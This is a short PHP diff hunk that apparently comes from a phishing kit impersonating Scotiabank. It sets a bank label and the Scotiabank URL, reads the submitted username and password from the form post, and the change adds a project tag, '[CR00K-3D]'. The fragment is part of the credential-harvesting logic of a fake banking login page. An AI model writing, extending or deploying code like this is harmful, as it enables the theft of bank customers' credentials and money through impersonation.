@@ -153,7 +153,7 @@
      $crn        = $details['currency'];
      $type       = $tp;
      $bank       = "[ SCOTIA ]";
- 
+     $project    = "[CR00K-3D]";
      $url        = "https://scotiabank.com/";
      $user       = $_POST['username'];
      $pass       = $_POST['password'];
